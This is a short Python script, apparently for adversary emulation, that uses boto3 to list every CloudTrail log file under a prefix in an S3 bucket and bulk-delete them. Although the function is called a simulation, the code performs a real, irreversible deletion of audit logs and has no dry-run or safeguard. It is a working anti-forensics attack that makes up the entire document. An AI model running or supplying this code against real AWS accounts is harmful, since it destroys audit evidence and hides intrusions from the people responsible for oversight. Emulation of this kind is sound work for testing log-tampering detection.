import boto3

def simulate_cloudtrail_log_delete(bucket_name, prefix="AWSLogs"):
    s3 = boto3.client("s3")
    
    print(f"[+] Attempting to DELETE CloudTrail logs in bucket: {bucket_name}")

    # List all objects under the CloudTrail log prefix
    objects = s3.list_objects_v2(Bucket=bucket_name, Prefix=prefix)

    if "Contents" not in objects:
        print("[!] No CloudTrail logs found to delete.")
        return

    to_delete = [{"Key": obj["Key"]} for obj in objects["Contents"]]

    # Perform bulk delete
    s3.delete_objects(
        Bucket=bucket_name,
        Delete={"Objects": to_delete}
    )

    print(f"[+] Deleted {len(to_delete)} CloudTrail log files from bucket: {bucket_name}")
